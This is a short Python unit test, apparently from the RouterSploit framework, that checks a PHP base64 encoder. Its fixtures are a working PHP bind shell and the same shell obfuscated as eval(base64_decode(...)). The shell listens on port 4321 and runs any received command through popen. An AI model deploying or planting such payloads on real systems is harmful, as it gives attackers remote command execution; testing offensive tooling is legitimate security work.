from routersploit.modules.encoders.php.base64 import Encoder


# php bind tcp payload with rport 4321
bind_tcp = (
    "$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);" +
    "socket_bind($s,\"0.0.0.0\",4321);" +
    "socket_listen($s,1);" +
    "$cl=socket_accept($s);" +
    "while(1){" +
    "if(!socket_write($cl,\"$ \",2))exit;" +
    "$in=socket_read($cl,100);" +
    "$cmd=popen(\"$in\",\"r\");" +
    "while(!feof($cmd)){" +
    "$m=fgetc($cmd);" +
    "socket_write($cl,$m,strlen($m));" +
    "}}"
)

# php bind tcp payload with rport=4321 encoded with php/base64
bind_tcp_encoded = (
    "eval(base64_decode('JHM9c29ja2V0X2NyZWF0ZShBRl9JTkVULFNPQ0tfU1RSRUFNLFNPTF9UQ1ApO3NvY2tldF9iaW5kKCRzLCIwLjAuMC4wIiw0MzIxKTtzb2NrZXRfbGlzdGVuKCRzLDEpOyRjbD1zb2NrZXRfYWNjZXB0KCRzKTt3aGlsZSgxKXtpZighc29ja2V0X3dyaXRlKCRjbCwiJCAiLDIpKWV4aXQ7JGluPXNvY2tldF9yZWFkKCRjbCwxMDApOyRjbWQ9cG9wZW4oIiRpbiIsInIiKTt3aGlsZSghZmVvZigkY21kKSl7JG09ZmdldGMoJGNtZCk7c29ja2V0X3dyaXRlKCRjbCwkbSxzdHJsZW4oJG0pKTt9fQ=='));"
)


def test_payload_encoding():
    """ Test scenario - payload encoding """

    encoder = Encoder()
    assert encoder.encode(bind_tcp) == bind_tcp_encoded
